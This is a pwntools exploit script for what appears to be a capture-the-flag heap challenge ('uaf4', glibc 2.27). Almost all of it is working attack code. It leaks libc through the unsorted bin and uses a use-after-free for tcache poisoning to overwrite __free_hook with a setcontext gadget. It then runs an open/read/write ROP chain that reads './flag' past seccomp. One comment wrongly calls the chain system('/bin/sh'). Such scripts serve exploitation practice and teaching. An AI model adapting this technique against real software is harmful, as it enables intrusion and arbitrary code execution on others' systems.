#!/usr/bin/env python2
# -*- coding: utf-8 -*
import re
import os
from pwn import *


se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb, timeout = 1)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
lg = lambda name,data : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)

def debug(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    gdbscript = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p, gdbscript)
    time.sleep(1)

def alloc(idx, size):
    sla(">", "1")
    sla("idx:", str(idx))
    sla("size: ", str(size))

def free(idx):
    sla(">", "2")
    sla("idx:", str(idx))

def read(idx, data):
    sla(">", "3")
    sla("idx:", str(idx))
    sa("data:", data)

def write(idx):
    sla(">", "4")
    sla("idx: \n", str(idx))
    s = ru("1. alloc")
    return s

elf = ELF('./uaf4')
context(arch = elf.arch ,log_level = 'debug', os = 'linux',terminal = ['tmux', 'splitw', '-hp','62'])
p = process("./uaf4")




## [Glibc 2.27 UAF Seccomp Attack Roadmap]
## 1. Leak libc address from unsorted bin
## 2. Leverage UAF vulnerability to perform tcachebin attack to free_hook
## 3. Modify free_hook to setcontext + 0x61




## ---------------------- [Step 1] -------------------------- ##
## Prepare heap chunk for attacking
alloc(0, 0x100)
alloc(1, 0x100)
alloc(2, 0x600)
alloc(3, 0x10)

## Size of chunk 2 is 0x600, would be placed into unsorted bin 
free(2)

## Since chunk 1 is in unsorted bin, the first 8 bytes is the address of unsorted bin
## unsorted_bin --> chunk 1 --> unsorted_bin
leak_addr = u64(write(2) + "\x00\x00")
log.success(hex(leak_addr))


## Calculate system and free_hook address
libc_base = leak_addr - 0x3ebca0
setcontext_addr = libc_base + 0x52085
free_hook_addr = libc_base + 0x3ed8e8
read_addr = libc_base + 0x110020
open_addr = libc_base + 0x10fbf0
write_addr = libc_base + 0x1100f0
ret_gadget = libc_base + 0x1b97
pop_rdx = libc_base + 0x1b96
pop_rdi = libc_base + 0x2164f
pop_rsi = libc_base + 0x23a6a
pop_rax = libc_base + 0x1b500
syscall = read_addr + 0xf



# [setcontext gadget]
# 0x7f0302428085 <setcontext+53>:      mov    rsp,QWORD PTR [rdi+0xa0]
# 0x7f030242808c <setcontext+60>:      mov    rbx,QWORD PTR [rdi+0x80]
# 0x7f0302428093 <setcontext+67>:      mov    rbp,QWORD PTR [rdi+0x78]
# 0x7f0302428097 <setcontext+71>:      mov    r12,QWORD PTR [rdi+0x48]
# 0x7f030242809b <setcontext+75>:      mov    r13,QWORD PTR [rdi+0x50]
# 0x7f030242809f <setcontext+79>:      mov    r14,QWORD PTR [rdi+0x58]
# 0x7f03024280a3 <setcontext+83>:      mov    r15,QWORD PTR [rdi+0x60]
# 0x7f03024280a7 <setcontext+87>:      mov    rcx,QWORD PTR [rdi+0xa8]
# 0x7f03024280ae <setcontext+94>:      push   rcx
# 0x7f03024280af <setcontext+95>:      mov    rsi,QWORD PTR [rdi+0x70]
# 0x7f03024280b3 <setcontext+99>:      mov    rdx,QWORD PTR [rdi+0x88]
# 0x7f03024280ba <setcontext+106>:     mov    rcx,QWORD PTR [rdi+0x98]
# 0x7f03024280c1 <setcontext+113>:     mov    r8,QWORD PTR [rdi+0x28]
# 0x7f03024280c5 <setcontext+117>:     mov    r9,QWORD PTR [rdi+0x30]
# 0x7f03024280c9 <setcontext+121>:     mov    rdi,QWORD PTR [rdi+0x68]
# 0x7f03024280cd <setcontext+125>:     xor    eax,eax
# 0x7f03024280cf <setcontext+127>:     ret




## ---------------------- [Step 2] -------------------------- ##
free(0)
free(1)

## Size of chunk_0 and chunk_1 is 0x100, among size of tcachebin
## tcache_bin(0x110) --> chunk_1 --> chunk_0
chunk_0_addr = u64(write(1) + "\x00\x00")
chunk_1_addr = chunk_0_addr + 0x110
log.success(hex(chunk_0_addr))


## Edit fd pointer of chunk_1, let it point to free_hook
read(0, p64(free_hook_addr))


## tcache_bin(0x110) --> chunk_1 --> chunk_0 --> free_hook
## chunk_4 would be overlapped with chunk_1
## chunk_5 would be overlapped with chunk_0
alloc(4, 0x100)
alloc(5, 0x100)


## tcache_bin(0x110) --> free_hook
## chunk_6 would be overlapped with free_hook
alloc(6, 0x100)





## ---------------------- [Step 3] -------------------------- ##
## Modify free_hook to be setcontext_addr
read(6, p64(setcontext_addr))


## The below operation would be system("/bin/sh")
## open("./flag", 0)
payload = p64(pop_rdi) + p64(chunk_1_addr + 0xa8)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rax) + p64(2)
payload += p64(syscall)

## read(3, chunk_0_addr + 0xc0, 0x30)
payload += p64(pop_rdi) + p64(3)
payload += p64(pop_rsi) + p64(chunk_1_addr + 0xc0)
payload += p64(pop_rdx) + p64(0x30) + p64(read_addr)

## write(1, chunk_0_addr + 0xc0, 0x30)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(chunk_1_addr + 0xc0)
payload += p64(pop_rdx) + p64(0x30) + p64(write_addr)


##
payload += "./flag"

## chunk_1 is used to store rop chain
read(1, payload)

## chunk_5 is used to trigger the rop
payload2 = "".ljust(0xa0, "a") + p64(chunk_1_addr) + p64(ret_gadget)
read(5, payload2)

## begin rop
free(5)
p.interactive()